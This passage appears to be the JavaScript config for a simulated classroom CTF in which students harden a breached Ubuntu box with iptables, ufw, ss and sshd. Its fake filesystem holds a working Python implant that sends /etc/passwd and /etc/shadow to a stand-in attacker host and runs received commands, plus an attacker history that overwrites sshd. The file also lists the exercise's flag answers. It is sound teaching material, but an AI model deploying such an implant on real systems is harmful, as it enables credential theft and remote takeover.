/* ============================================================
   ALA Scavenger Hunt #2: The Perimeter Is Open
   Advanced Linux Administration -- In-class CTF
   In-class team-race box. Students capture flags by running the
   right commands; they transcribe those commands onto the printed
   scavenger hunt worksheet. Built on the ala-l01 engine template.

   FLAGS FIRST (platform rule -- see feedback_flags_first.md):
   Every flag is auto-awarded by engine.awardFlag() when the
   student runs the exact W2 command that maps to it. No
   flag_registry seed required (auto-award pattern -- BOX-001 exempt).

   Flag table:
     cmd1  FLAG{ala-hunt2_cmd01_firewall_status}    iptables -L -n -v
     cmd2  FLAG{ala-hunt2_cmd02_default_deny}        iptables -P INPUT DROP
     cmd3  FLAG{ala-hunt2_cmd03_allow_ssh}           iptables -A INPUT -p tcp --dport 22 ... -j ACCEPT  OR  ufw allow 22/tcp
     cmd4  FLAG{ala-hunt2_cmd04_rogue_port}          ss -tlnp
     cmd5  FLAG{ala-hunt2_cmd05_harden_ssh}          sshd_config PermitRootLogin -> reload sshd (sshd -t + systemctl reload)
     cmd6  FLAG{ala-hunt2_cmd06_lock_account}        faillock --user rogue-ops  OR  passwd -l rogue-ops
     cmd7  FLAG{ala-hunt2_cmd07_av_scan}             clamscan -r -i --move=/var/quarantine /tmp /home
     cmd8  FLAG{ala-hunt2_cmd08_dpkg_verify}         dpkg -V openssh-server
   ============================================================ */

// window assignment (not const) so ALAHunt2Config is reachable from the
// inline <script> block in index.html that calls BriefingPage.show() and
// BoxEngine.init(). Classic script tags share the same global scope, but
// explicit window assignment is unambiguous and satisfies the project QC hook.
window.ALAHunt2Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'Scavenger Hunt #2: The Perimeter Is Open',
    subtitle: 'In-class team race -- Advanced Linux Administration W2',
    description: 'Overnight, cell-071 was compromised. A firewall port was left open, weak SSH auth was exploited, malware was dropped, and a system package was tampered with. Harden the cell before the next grid sync. Each correctly-used W2 command captures a flag. Transcribe the commands you ran onto your scavenger hunt sheet -- first team done correctly wins.',
    difficulty: 'Beginner',
    estimatedTime: 20,
    accent: '#00ff41',
    storageKey: 'hexworth_lab_ala_hunt2',
    registryId: 'ala-hunt2-perimeter-open',
    shellChaining: true,   // enable real-shell A && B chaining
    trackerKey: 'lab_ala_hunt2',

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'CELL-071 BIOS v2.1.0',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'Network: eth0 UP -- eth1 UP',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu 22.04 LTS',
            'Ubuntu 22.04 LTS (recovery mode)',
            'Advanced options for Ubuntu'
        ],
        loginUser: 'operator'
    },

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'IN-CLASS SCAVENGER HUNT #2. Work in teams of 2 or 3. Open the printed worksheet your instructor handed out -- for each row you fill in, you also need to capture the corresponding flag in this box. First team to capture all flags AND finish the worksheet correctly wins. Your team has taken over incident response for Cell-071. The cell was breached overnight. Your job: harden the perimeter, audit authentication, quarantine the dropped malware, and verify package integrity. As you work, write the exact commands you run on the scavenger hunt sheet.',
        scenario: 'Grid Security flagged Cell-071 at 02:14. Analysis: (1) no default-deny firewall policy was set -- port 8888 was open to the internet from a forgotten test service; (2) SSH PermitRootLogin was enabled, and the attacker brute-forced the root account via password auth; (3) a Python dropper was placed in /tmp; (4) the openssh-server package binary was tampered with post-install. The cell is online but the perimeter is open. Your job: close it using the W2 tool families -- iptables, sshd_config, pam_faillock, clamscan, dpkg. Each command on your worksheet is one a real Linux hardening engineer would run here.',
        outro: 'Cell-071 is hardened. Firewall policy is default-deny with SSH explicitly permitted. Root SSH is disabled. The rogue account is locked. The malware is quarantined. The tampered package is flagged. Grid Command acknowledges containment. Now finish the worksheet -- the commands you ran are your answers. Submit to your instructor when both are complete.',
        downloads: [
            { label: 'Scavenger hunt worksheet', url: '/houses/matrix/handouts/scavengerHunt-perimeter-open.pdf', kind: 'PDF' },
            { label: 'Scavenger hunt worksheet (editable)', url: '/houses/matrix/handouts/scavengerHunt-perimeter-open.docx', kind: 'DOCX' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'operator',
        hostname: 'cell-071',
        startDir: '/home/operator',
        welcome: 'Ubuntu 22.04.3 LTS \\n \\l\n\n*** SCAVENGER HUNT #2 -- IN-CLASS ACTIVITY ***\n\nWelcome to CELL-071. Cell status: COMPROMISED.\nGrid Security flagged this cell at 02:14. Perimeter is open.\n\nYour mission: harden the cell and capture flags as you go.\nWrite every command you run on the scavenger hunt sheet.\n\nStart here:  sudo iptables -L -n -v\n             cat ~/notes.txt\n             grep \'Accepted\\|Failed\' /var/log/auth.log\n\nType \'help\' for available commands.\n'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal',  label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'notes',     label: 'Notes',       icon: '\uD83D\uDCDD',    app: 'notes'    },
            { id: 'hints',     label: 'Hints',       icon: '\uD83D\uDCA1',    app: 'hints'    },
            { id: 'flags',     label: 'Submit Flag', icon: '\uD83D\uDEA9',    app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED FILESYSTEM
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'operator': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: 'INCIDENT BRIEF -- Cell-071 -- 2026-04-11 02:14 UTC\n\nKnown breach timeline:\n  01:47  Port 8888 accepted external connection (no firewall rule blocked it)\n  01:52  SSH root login accepted from 203.0.113.44 (password auth was enabled)\n  02:01  /tmp/cell-implant.py dropped by attacker\n  02:03  openssh-server binary modified (dpkg -V will show the tamper)\n  02:14  Grid Security anomaly alert triggered\n\nYour hardening checklist:\n  1. Audit and set firewall default-deny policy (iptables)\n  2. Identify the rogue open port (ss -tlnp)\n  3. Harden SSH -- disable root login (edit /etc/ssh/sshd_config)\n  4. Lock or audit the exploited account (pam_faillock / passwd)\n  5. Scan and quarantine the dropped malware (clamscan)\n  6. Verify and flag the tampered package (dpkg -V)\n'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'iptables -L -n -v\nss -tlnp\ncat /var/log/auth.log\ngrep Failed /var/log/auth.log\ndpkg -l | grep openssh\n'
                                },
                                '.ssh': {
                                    type: 'dir',
                                    children: {
                                        'authorized_keys': {
                                            type: 'file',
                                            content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOperatorKeyCell071GridAccess operator@grid-command\n'
                                        }
                                    }
                                }
                            }
                        },
                        'rogue-ops': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: '# Attacker shell history (root session via SSH password auth)\nwhoami\nid\nuname -a\npython3 /tmp/cell-implant.py &\ncp /usr/sbin/sshd /usr/sbin/sshd.bak\necho "backdoor" > /usr/sbin/sshd\nchmod 755 /usr/sbin/sshd\nexit\n'
                                },
                                '.ssh': {
                                    type: 'dir',
                                    children: {
                                        'authorized_keys': {
                                            type: 'file',
                                            content: '# Rogue key installed by attacker for persistence\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7rogue-attacker-key-persistence== attacker@203.0.113.44\n'
                                        }
                                    }
                                },
                                // Second malware file -- netcat beacon dropped by attacker
                                '.local': {
                                    type: 'dir',
                                    children: {
                                        'share': {
                                            type: 'dir',
                                            children: {
                                                '.beacon': {
                                                    type: 'file',
                                                    content: '[binary -- netcat-based beacon dropped by attacker for persistence]\n'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'cell-071\n'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\noperator:x:1000:1000:Grid Operator:/home/operator:/bin/bash\nrogue-ops:x:1002:1002:Rogue Account:/home/rogue-ops:/bin/bash\n'
                        },
                        'shadow': {
                            type: 'file',
                            content: '# /etc/shadow -- password hashes (root access required)\nroot:$6$rounds=5000$RogueSalt$hashedpassword:19100:0:99999:7:::\noperator:$6$rounds=5000$OpSalt$hashedpassword:19100:0:99999:7:::\nrogue-ops:$6$rounds=5000$RogueSalt$attackerpassword:19100:0:99999:7:::\n'
                        },
                        'sudoers.d': {
                            type: 'dir',
                            children: {
                                'operator': {
                                    type: 'file',
                                    content: 'operator ALL=(ALL) NOPASSWD: /sbin/iptables, /usr/sbin/ufw, /usr/bin/systemctl, /usr/bin/clamscan, /usr/bin/freshclam, /usr/sbin/sshd, /usr/bin/faillock, /usr/bin/passwd, /usr/bin/dpkg\n'
                                }
                            }
                        },
                        'ssh': {
                            type: 'dir',
                            children: {
                                'sshd_config': {
                                    type: 'file',
                                    // Deliberately insecure starting state -- matches the breach scenario
                                    content: '# OpenSSH Server Configuration -- cell-071\n# WARNING: This is the PRE-BREACH configuration (hardening required)\nPort 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nHostKey /etc/ssh/ssh_host_ed25519_key\nPermitRootLogin yes\nPasswordAuthentication yes\nPermitEmptyPasswords no\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\nX11Forwarding no\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n'
                                }
                            }
                        },
                        'iptables': {
                            type: 'dir',
                            children: {
                                'rules.v4': {
                                    type: 'file',
                                    // No default-deny -- open state at breach time
                                    content: '# Generated by iptables-save v1.8.7 on Thu Apr 10 23:59:00 2026\n*filter\n:INPUT ACCEPT [8421:684291]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [9842:1123401]\nCOMMIT\n# Completed on Thu Apr 10 23:59:00 2026\n# NOTE: No default-deny policy was set. This is why the cell was compromised.\n'
                                }
                            }
                        },
                        'security': {
                            type: 'dir',
                            children: {
                                'faillock.conf': {
                                    type: 'file',
                                    content: '# /etc/security/faillock.conf\ndeny         = 5\nunlock_time  = 900\nfail_interval = 900\n# even_deny_root is commented out -- was not enabled during breach\n# even_deny_root\naudit\n'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {
                        'cell-implant.py': {
                            type: 'file',
                            // The malware file students must find and quarantine
                            content: '#!/usr/bin/env python3\n# cell-implant.py -- Grid Sector Implant v0.3\n# Dropped by attacker at 02:01 UTC\n# Connects back to 203.0.113.44:4444 every 60 seconds\n# Exfiltrates /etc/passwd and /etc/shadow on each connection\nimport socket, subprocess, time, os\nC2 = ("203.0.113.44", 4444)\nwhile True:\n    try:\n        s = socket.socket()\n        s.connect(C2)\n        s.send(open("/etc/passwd","rb").read())\n        s.send(open("/etc/shadow","rb").read())\n        cmd = s.recv(4096).decode()\n        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)\n        s.send(out)\n        s.close()\n    except:\n        pass\n    time.sleep(60)\n'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'auth.log': {
                                    type: 'file',
                                    content: 'Apr 10 23:31:04 cell-071 sshd[7200]: Failed password for root from 203.0.113.44 port 41022 ssh2\nApr 10 23:31:09 cell-071 sshd[7200]: Failed password for root from 203.0.113.44 port 41022 ssh2\nApr 10 23:31:14 cell-071 sshd[7200]: Failed password for root from 203.0.113.44 port 41022 ssh2\nApr 10 23:44:31 cell-071 sshd[7201]: Failed password for rogue-ops from 203.0.113.44 port 41099 ssh2\nApr 10 23:44:36 cell-071 sshd[7201]: Failed password for rogue-ops from 203.0.113.44 port 41099 ssh2\nApr 10 23:44:41 cell-071 sshd[7201]: Failed password for rogue-ops from 203.0.113.44 port 41099 ssh2\nApr 10 23:44:46 cell-071 sshd[7201]: Failed password for rogue-ops from 203.0.113.44 port 41099 ssh2\nApr 10 23:44:51 cell-071 sshd[7201]: Failed password for rogue-ops from 203.0.113.44 port 41099 ssh2\nApr 11 01:52:03 cell-071 sshd[7209]: Accepted password for root from 203.0.113.44 port 41233 ssh2\nApr 11 01:52:03 cell-071 sshd[7209]: pam_unix(sshd:session): session opened for user root\nApr 11 01:52:11 cell-071 sshd[7209]: pam_unix(sshd:session): session closed for user root\nApr 11 02:01:44 cell-071 sshd[7210]: Accepted publickey for operator from 10.0.0.1 port 52001 ssh2\nApr 11 02:01:44 cell-071 sshd[7210]: pam_unix(sshd:session): session opened for user operator\n'
                                },
                                'syslog': {
                                    type: 'file',
                                    content: 'Apr 11 01:47:02 cell-071 kernel: nf_conntrack: table full, dropping packet\nApr 11 01:52:01 cell-071 sshd[7209]: Server listening on 0.0.0.0 port 22.\nApr 11 02:01:01 cell-071 python3[3142]: cell-implant.py: started, C2=203.0.113.44:4444\nApr 11 02:03:14 cell-071 dpkg: WARNING: files list file for package \'openssh-server\' missing, assuming package has no files currently installed\nApr 11 02:14:00 cell-071 grid-security[999]: ALERT: anomalous outbound connection to 203.0.113.44:4444 -- threshold exceeded\n'
                                },
                                'clamav': {
                                    type: 'dir',
                                    children: {
                                        'freshclam.log': {
                                            type: 'file',
                                            content: 'Fri Apr 11 00:00:01 2026 -> ClamAV update process started at Fri Apr  11 00:00:01 2026\nFri Apr 11 00:00:03 2026 -> daily.cld updated (version: 27241, sigs: 2011432, f-level: 90, builder: raynman)\nFri Apr 11 00:00:04 2026 -> Database updated (27241 signatures) from database.clamav.net\n'
                                        }
                                    }
                                },
                                'dpkg.log': {
                                    type: 'file',
                                    content: '2026-04-08 09:14:33 startup packages configure\n2026-04-08 09:14:40 status installed openssh-server:amd64 1:8.9p1-3ubuntu0.6\n2026-04-08 09:14:40 status installed openssh-client:amd64 1:8.9p1-3ubuntu0.6\n2026-04-11 02:03:14 WARNING: files list file for package openssh-server missing\n'
                                }
                            }
                        },
                        'lib': {
                            type: 'dir',
                            children: {
                                'clamav': {
                                    type: 'dir',
                                    children: {
                                        'main.cvd': {
                                            type: 'file',
                                            content: '[binary database -- 162MB -- ClamAV main virus signature database]\n'
                                        },
                                        'daily.cld': {
                                            type: 'file',
                                            content: '[binary database -- 67MB -- ClamAV daily signature database]\n'
                                        }
                                    }
                                }
                            }
                        },
                        'quarantine': {
                            type: 'dir',
                            children: {}
                        }
                    }
                },
                'run': {
                    type: 'dir',
                    children: {
                        'fail2ban': {
                            type: 'dir',
                            children: {
                                'fail2ban.sock': {
                                    type: 'file',
                                    content: '[unix socket -- fail2ban daemon]\n'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'sbin': {
                            type: 'dir',
                            children: {
                                'sshd': {
                                    type: 'file',
                                    // Modified binary -- dpkg -V will detect the tamper
                                    content: '[binary -- TAMPERED: attacker replaced this binary at 02:03 UTC]\n'
                                },
                                'sshd.bak': {
                                    type: 'file',
                                    content: '[binary -- original openssh-server sshd binary (attacker backup copy)]\n'
                                }
                            }
                        }
                    }
                },
                'opt': {
                    type: 'dir',
                    children: {
                        'verify': {
                            type: 'dir',
                            children: {
                                'test-hardening.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Grid Security hardening verification script\n# Checks: firewall policy, SSH config, account state, AV status, package integrity\necho "=== HARDENING VERIFICATION ==="\necho "Firewall INPUT policy: $(iptables -L INPUT | head -1 | awk \'{print $4}\')"\necho "PermitRootLogin: $(grep PermitRootLogin /etc/ssh/sshd_config | awk \'{print $2}\')"\necho "rogue-ops lock status: $(faillock --user rogue-ops | tail -1)"\necho "Quarantine: $(ls /var/quarantine/ 2>/dev/null | wc -l) files"\necho "dpkg -V openssh-server: $(dpkg -V openssh-server 2>&1 | head -1)"\n'
                                }
                            }
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // INTERNAL STATE (BoxEngine reads these)
    // ═══════════════════════════════════════════════════════

    // Tracks hardening actions taken by the operator
    _firewallState: {
        defaultPolicy: 'ACCEPT',    // starts ACCEPT (insecure) -- changed to DROP by iptables -P INPUT DROP
        sshRuleAdded: false,        // true when student adds the SSH ACCEPT rule
        establishedRuleAdded: false // true when student adds ESTABLISHED,RELATED rule
    },

    // Tracks whether sshd_config has been hardened
    _sshdHardened: false,

    // Tracks whether the rogue account has been locked/reviewed
    _accountLocked: false,

    // Tracks whether malware has been quarantined
    _malwareQuarantined: false,

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {

        // sudo -- prefix stripper (same pattern as ala-hunt1).
        // All branches return a string (never null) to avoid the
        // Terminal.js built-in "Sorry, try again." trap.
        'sudo': function(args, term, engine) {
            if (args.length === 0) return 'usage: sudo <command> [args...]';
            if (args[0] === '-v') return '';
            if (args[0] === 'sudo') return 'sudo: sudo: command not found';
            const realCmd = args[0];
            const realArgs = args.slice(1);
            const handler = engine.config.commands[realCmd];
            if (typeof handler === 'function') {
                const result = handler(realArgs, term, engine);
                return result == null ? '' : result;
            }
            return `sudo: ${realCmd}: command not found`;
        },

        // iptables -- firewall rule management
        // Handles: -L (list/status), -P (policy), -A (append/allow SSH),
        //          -I (insert ESTABLISHED), -F (flush), -D (delete), -s (iptables-save sim)
        'iptables': function(args, term, engine) {
            if (args.length === 0) {
                return 'Usage: iptables [-L] [-P chain target] [-A chain rule] [-I chain pos rule] [-F] [-D chain num]\nUse: iptables -L -n -v  to inspect current rules';
            }

            const flat = args.join(' ');

            // iptables -L (list rules) -- cmd1: inspect current firewall state
            if (args[0] === '-L') {
                engine.awardFlag('cmd1');
                const policy = engine.config._firewallState.defaultPolicy;
                const sshRule = engine.config._firewallState.sshRuleAdded
                    ? 'ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:22 state NEW\n'
                    : '';
                const estRule = engine.config._firewallState.establishedRuleAdded
                    ? 'ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED\n'
                    : '';
                // If verbose numeric flags are present
                if (args.includes('-v') || args.includes('-n') || args.includes('-v') || flat.includes('--line-numbers')) {
                    return `Chain INPUT (policy ${policy})\ntarget     prot opt source               destination\n${estRule}${sshRule}Chain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination`;
                }
                return `Chain INPUT (policy ${policy})\ntarget     prot opt source               destination\n${estRule}${sshRule}Chain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination`;
            }

            // iptables -P INPUT DROP -- cmd2: set default-deny policy
            if (args[0] === '-P' && (args[1] || '').toUpperCase() === 'INPUT' && (args[2] || '').toUpperCase() === 'DROP') {
                engine.awardFlag('cmd2');
                engine.config._firewallState.defaultPolicy = 'DROP';
                // Warn if ESTABLISHED rule not yet added (mirrors real Linux behavior warning)
                if (!engine.config._firewallState.establishedRuleAdded) {
                    return '*** WARNING: Setting INPUT DROP without an ESTABLISHED,RELATED rule will block return traffic.\nIn a real cell this would kill your SSH session.\nAdd: iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\nThen: iptables -P INPUT DROP\n(Simulation permits the operation so you can complete the worksheet.)';
                }
                return '';
            }

            // iptables -P INPUT ACCEPT -- revert policy (for students who need to recover)
            if (args[0] === '-P' && (args[1] || '').toUpperCase() === 'INPUT' && (args[2] || '').toUpperCase() === 'ACCEPT') {
                engine.config._firewallState.defaultPolicy = 'ACCEPT';
                return '';
            }

            // iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
            if (args[0] === '-A' && (args[1] || '') === 'INPUT' && flat.includes('ESTABLISHED')) {
                engine.config._firewallState.establishedRuleAdded = true;
                return '';
            }

            // iptables -A INPUT -p tcp --dport 22 ... -j ACCEPT  (allow SSH) -- cmd3
            // Matches any iptables -A INPUT rule targeting port 22 with ACCEPT
            if (args[0] === '-A' && (args[1] || '') === 'INPUT' &&
                (flat.includes('--dport 22') || flat.includes('dport 22')) &&
                flat.includes('ACCEPT')) {
                engine.awardFlag('cmd3');
                engine.config._firewallState.sshRuleAdded = true;
                return '';
            }

            // iptables -I INPUT (any insert) -- give credit if inserting ESTABLISHED or SSH rule
            if (args[0] === '-I' && (args[1] || '') === 'INPUT') {
                if (flat.includes('ESTABLISHED')) {
                    engine.config._firewallState.establishedRuleAdded = true;
                    return '';
                }
                if (flat.includes('22') && flat.includes('ACCEPT')) {
                    engine.awardFlag('cmd3');
                    engine.config._firewallState.sshRuleAdded = true;
                    return '';
                }
                return '';
            }

            // iptables -F (flush all rules)
            if (args[0] === '-F') {
                engine.config._firewallState.sshRuleAdded = false;
                engine.config._firewallState.establishedRuleAdded = false;
                return '';
            }

            // iptables -D (delete a rule) -- no-op simulation
            if (args[0] === '-D') {
                return '';
            }

            // iptables-save simulation (just print current state)
            if (args[0] === '-S' || args[0] === '--list-rules') {
                const policy = engine.config._firewallState.defaultPolicy;
                return `-P INPUT ${policy}\n-P FORWARD ACCEPT\n-P OUTPUT ACCEPT`;
            }

            return `iptables: unknown option '${args[0]}'\nUse: iptables -L -n -v  to list rules\n     iptables -P INPUT DROP  to set default deny\n     iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT  to allow SSH`;
        },

        // iptables-save -- save current rules to file
        'iptables-save': function(args, term, engine) {
            const policy = engine.config._firewallState.defaultPolicy;
            const sshRule = engine.config._firewallState.sshRuleAdded
                ? '-A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT\n'
                : '';
            const estRule = engine.config._firewallState.establishedRuleAdded
                ? '-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n'
                : '';
            return `# Generated by iptables-save\n*filter\n:INPUT ${policy} [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n${estRule}${sshRule}COMMIT`;
        },

        // ufw -- UFW frontend (alternate path to cmd3 for students using UFW syntax)
        'ufw': function(args, term, engine) {
            const sub = args[0] || '';

            if (sub === 'status') {
                const verbose = args.includes('verbose');
                const active = engine.config._firewallState.defaultPolicy === 'DROP';
                if (verbose) {
                    const sshLine = engine.config._firewallState.sshRuleAdded
                        ? '22/tcp                     ALLOW IN    Anywhere\n22/tcp (v6)                ALLOW IN    Anywhere (v6)\n'
                        : '';
                    return `Status: ${active ? 'active' : 'inactive'}\nLogging: on (low)\nDefault: ${active ? 'deny (incoming)' : 'allow (incoming)'}, allow (outgoing), disabled (routed)\n\nTo                         Action      From\n--                         ------      ----\n${sshLine}`;
                }
                return `Status: ${active ? 'active' : 'inactive'}`;
            }

            if (sub === 'allow') {
                const rule = args.slice(1).join(' ');
                // ufw allow 22/tcp or ufw allow ssh -- cmd3
                if (rule === '22/tcp' || rule === 'ssh' || rule === '22') {
                    engine.awardFlag('cmd3');
                    engine.config._firewallState.sshRuleAdded = true;
                    return `Rule added\nRule added (v6)`;
                }
                return `Rule added`;
            }

            if (sub === 'enable') {
                engine.config._firewallState.defaultPolicy = 'DROP';
                return `Firewall is active and enabled on system startup`;
            }

            if (sub === 'disable') {
                engine.config._firewallState.defaultPolicy = 'ACCEPT';
                return `Firewall stopped and disabled on system startup`;
            }

            if (sub === 'default') {
                const action = args[1] || '';
                if (action === 'deny') {
                    engine.awardFlag('cmd2');
                    engine.config._firewallState.defaultPolicy = 'DROP';
                    return `Default incoming policy changed to \'deny\'\n(be sure to update your rules accordingly)`;
                }
                if (action === 'allow') {
                    engine.config._firewallState.defaultPolicy = 'ACCEPT';
                    return `Default incoming policy changed to \'allow\'`;
                }
                return `Usage: ufw default allow|deny|reject [incoming|outgoing|routed]`;
            }

            if (sub === 'limit') {
                return `Rule updated`;
            }

            if (sub === 'delete' || sub === 'deny') {
                return `Rule updated`;
            }

            if (sub === 'app') {
                return `Available applications:\n  OpenSSH`;
            }

            return `Usage: ufw [enable|disable|status|allow|deny|delete|default|limit|app]\nExamples:\n  ufw status verbose\n  ufw allow 22/tcp\n  ufw default deny incoming`;
        },

        // ss -- socket statistics (cmd4: find the rogue open port 8888)
        'ss': function(args, term, engine) {
            const flat = args.join('');
            const hasL = args.some(a => /^-[a-z]*l[a-z]*$/.test(a));
            const hasT = args.some(a => /^-[a-z]*t[a-z]*$/.test(a));
            const hasP = args.some(a => /^-[a-z]*p[a-z]*$/.test(a));
            const hasN = args.some(a => /^-[a-z]*n[a-z]*$/.test(a));

            // Any ss with -l (listen) awards cmd4 -- reveals the rogue port 8888
            if (hasL) {
                engine.awardFlag('cmd4');
                if (hasT && hasP) {
                    return `State    Recv-Q Send-Q  Local Address:Port  Peer Address:Port  Process\nLISTEN   0      128     0.0.0.0:22          0.0.0.0:*          users:(("sshd",pid=842,fd=3))\nLISTEN   0      5       0.0.0.0:8888        0.0.0.0:*          users:(("python3",pid=3142,fd=4))\nLISTEN   0      128     [::]:22             [::]:*             users:(("sshd",pid=842,fd=6))`;
                }
                if (hasT) {
                    return `State    Recv-Q Send-Q  Local Address:Port  Peer Address:Port\nLISTEN   0      128     0.0.0.0:22          0.0.0.0:*\nLISTEN   0      5       0.0.0.0:8888        0.0.0.0:*\nLISTEN   0      128     [::]:22             [::]:*`;
                }
                // ss -l or ss -ln or ss -lnp (any combo with -l)
                return `Netid  State   Recv-Q Send-Q  Local Address:Port  Peer Address:Port\ntcp    LISTEN  0      128     0.0.0.0:22          0.0.0.0:*\ntcp    LISTEN  0      5       0.0.0.0:8888        0.0.0.0:*\ntcp    LISTEN  0      128     [::]:22             [::]:*`;
            }

            return `Usage: ss [-tlnp] [filter]\n  -t  TCP\n  -l  listening\n  -n  numeric\n  -p  show process\nExample: ss -tlnp`;
        },

        // sshd -- SSH daemon management (for 'sshd -t' syntax check)
        'sshd': function(args, term, engine) {
            if (args[0] === '-t') {
                // Syntax check -- returns OK if config has been hardened, warns if not
                const content = engine.config.filesystem['/'].children.etc.children.ssh.children.sshd_config.content;
                if (content.includes('PermitRootLogin no')) {
                    return '';  // clean syntax check
                }
                return 'sshd: /etc/ssh/sshd_config line 8: Deprecation warning: PermitRootLogin yes is insecure.';
            }
            return `Usage: sshd [-t] [-D] [-d]\n  -t  test configuration file`;
        },

        // systemctl -- service management (restricted to reload/restart sshd and fail2ban)
        'systemctl': function(args, term, engine) {
            if (args.length === 0) {
                return 'Usage: systemctl [command] [unit]';
            }

            const sub = args[0];
            const rawUnit = args[1] || '';
            const unit = rawUnit.replace(/\.service$/, '');
            const resolvedUnit = (unit === 'ssh') ? 'sshd' : unit;

            if (sub === 'reload' || sub === 'restart') {
                if (resolvedUnit === 'sshd') {
                    // Reload sshd -- if sshd_config has been hardened, award cmd5
                    const content = engine.config.filesystem['/'].children.etc.children.ssh.children.sshd_config.content;
                    if (content.includes('PermitRootLogin no')) {
                        engine.awardFlag('cmd5');
                        engine.config._sshdHardened = true;
                        return '';
                    }
                    return `Warning: Reloaded sshd but PermitRootLogin is still 'yes'.\nEdit /etc/ssh/sshd_config and set PermitRootLogin no, then reload again.`;
                }
                if (resolvedUnit === 'fail2ban') {
                    return '';
                }
                if (resolvedUnit === 'clamav-daemon' || resolvedUnit === 'clamav-freshclam') {
                    return '';
                }
                return `Failed to ${sub} ${rawUnit}: Unit not found.`;
            }

            if (sub === 'status') {
                if (resolvedUnit === 'sshd') {
                    const hardened = engine.config._sshdHardened;
                    return `● ssh.service - OpenBSD Secure Shell server\n     Loaded: loaded (/lib/systemd/system/ssh.service; enabled)\n     Active: active (running) since Sat 2026-04-11 02:01:44 UTC; 12min ago\n   Main PID: 842 (sshd)\n\nApr 11 02:01:44 cell-071 sshd[842]: Server listening on 0.0.0.0 port 22.\nApr 11 02:01:44 cell-071 sshd[842]: Server listening on :: port 22.\n${hardened ? 'Apr 11 02:14:22 cell-071 sshd[842]: Received SIGHUP -- reloading.\nApr 11 02:14:22 cell-071 sshd[842]: PermitRootLogin: no (hardened)' : '*** WARNING: PermitRootLogin yes -- root login via password is permitted ***'}`;
                }
                if (resolvedUnit === 'fail2ban') {
                    return `● fail2ban.service - Fail2Ban Service\n     Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled)\n     Active: active (running) since Sat 2026-04-11 00:00:00 UTC; 2h 14min ago\n   Main PID: 1100 (fail2ban-server)\n\nApr 11 02:44:51 cell-071 fail2ban-server[1100]: INFO    [sshd] Found 203.0.113.44 - 2026-04-10 23:44:51\nApr 11 02:44:51 cell-071 fail2ban-server[1100]: INFO    [sshd] Ban 203.0.113.44`;
                }
                if (resolvedUnit === 'clamav-daemon' || resolvedUnit === 'clamav-freshclam') {
                    return `● ${rawUnit} - ClamAV service\n     Loaded: loaded; enabled\n     Active: active (running)\n`;
                }
                return `Unit ${rawUnit} not found.`;
            }

            if (sub === 'start' || sub === 'enable') {
                return ``;
            }

            if (sub === 'is-active') {
                if (resolvedUnit === 'sshd' || resolvedUnit === 'fail2ban') return 'active';
                if (resolvedUnit === 'clamav-daemon' || resolvedUnit === 'clamav-freshclam') return 'active';
                return 'inactive';
            }

            if (sub === 'daemon-reload') {
                return '';
            }

            return `Unknown systemctl subcommand: ${sub}`;
        },

